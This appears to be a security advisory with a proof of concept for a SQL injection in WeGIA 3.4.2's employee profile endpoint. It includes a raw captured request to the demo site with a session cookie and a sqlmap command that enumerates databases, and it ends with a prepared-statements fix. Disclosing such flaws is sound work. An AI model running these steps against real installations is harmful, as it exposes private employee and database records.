VIDEO POC: https://youtu.be/W648Rq4_DnE

Vulnerability Type: SQL Injection (Union-based / Error-based exfiltration)

#Affected Application: WeGIA version 3.4.2

#Vulnerable Endpoint: /html/funcionario/profile_funcionario.php?id_funcionario={ID}

#Vulnerable Parameter: id_funcionario (expected to be numeric, but unsafely concatenated into the query)

#Impact: Full exfiltration of database content (database names, tables, columns, sensitive records). Severe confidentiality breach and potential total data compromise.

🔧 PoC Step-by-Step

1 - Authentication:
Log into the WeGIA 3.4.2 platform with valid credentials (e.g., administrator account).

![image](https://github.com/user-attachments/assets/330d5f02-c10d-45c5-b541-b0d9cacbb4ed)

2 - Prepare a Test Record:
If necessary, register a new employee to obtain a controlled id_funcionario.

![image](https://github.com/user-attachments/assets/498ed9b6-b393-4c8c-9648-043c8054a348)

![image](https://github.com/user-attachments/assets/ce0a6536-5963-4b56-829c-1669f36712f2)

3 - Intercept and Save the Request:

![image](https://github.com/user-attachments/assets/035286ba-ea6f-4517-9b1d-ee7d1d861914)

4 - Access the employee profile page for a given ID, for example:

![image](https://github.com/user-attachments/assets/0dd122c3-d42d-40a8-a6db-e01cbc428805)

GET /html/funcionario/profile_funcionario.php?id_funcionario=2 HTTP/2  
Host: demo.wegia.org  
Cookie: _ga=GA1.1.620166737.1749629529; PHPSESSID=elbvoreo9ua2cs8812amnokbdc; _ga_F8DXBXLV8J=GS2.1.s1750752029$o5$g1$t1750752048$j41$l0$h0  
Accept-Language: pt-BR,pt;q=0.9  
Upgrade-Insecure-Requests: 1  
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36  
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7  
Sec-Fetch-Site: same-origin  
Sec-Fetch-Mode: navigate  
Sec-Fetch-Dest: document  
Sec-Ch-Ua: "Chromium";v="137", "Not/A)Brand";v="24"  
Sec-Ch-Ua-Mobile: ?0  
Sec-Ch-Ua-Platform: "Windows"  
Referer: https://demo.wegia.org/html/funcionario/informacao_funcionario.php  
Accept-Encoding: gzip, deflate, br  
Priority: u=0, i  

Use a proxy tool (Burp Suite, OWASP ZAP, etc.) to intercept and save this request in a file, e.g., request.txt.

5 - Run sqlmap with the Saved Request:

![image](https://github.com/user-attachments/assets/2494d08b-f54d-4f82-9562-4e65010cf5c7)

Execute sqlmap pointing to the saved file, testing injection and enumerating databases:

#sqlmap -r request.txt --batch --dbs

Sqlmap identifies the injection point in id_funcionario and confirms that the database is MySQL/MariaDB.

6 - After processing, sqlmap or manual analysis reveals existing databases, such as information_schema and wegia.

![image](https://github.com/user-attachments/assets/34720bfa-070c-4afc-b3ca-10f6997a5769)


⚠️ Recommendations & Mitigations

Prepared Statements / Parameterized Queries:
Always use bound parameters for id_funcionario instead of directly concatenating it into SQL.
